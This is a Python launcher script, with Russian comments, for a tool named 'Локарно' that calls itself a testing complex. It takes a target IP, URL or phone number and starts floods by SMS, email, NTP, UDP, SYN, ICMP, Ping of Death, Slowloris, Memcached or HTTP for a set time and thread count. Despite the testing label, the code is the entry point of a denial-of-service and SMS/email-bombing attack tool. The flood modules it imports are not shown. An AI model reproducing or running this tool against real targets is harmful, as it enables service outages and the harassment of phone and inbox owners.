# Многофункциональный комплекс тестирования АС-4 "Локарно"
# Импортирование 
import os
import sys
import argparse

# Переход в директорию
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Не удалось импортировать некоторые модули.", err)
    sys.exit(1)

# Парс
parser = argparse.ArgumentParser(description='М.К.Т. АС-4 "Локарно"')
parser.add_argument(
    "--target",
    type=str,
    metavar="<IP:PORT, URL, PHONE>",
    help="Объект тестирования - IP:порт, URL-адрес или телефон",
)
parser.add_argument(
    "--method",
    type=str,
    metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
    help="Метод тестирования",
)
parser.add_argument(
    "--time", type=int, default=10, metavar="<time>", help="время в секундах"
)
parser.add_argument(
    "--threads", type=int, default=3, metavar="<threads>", help="количество одновременных линий (1-200)"
)

# Аргументы
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target


if __name__ == "__main__":
    # Помощь
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Начать атаку
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
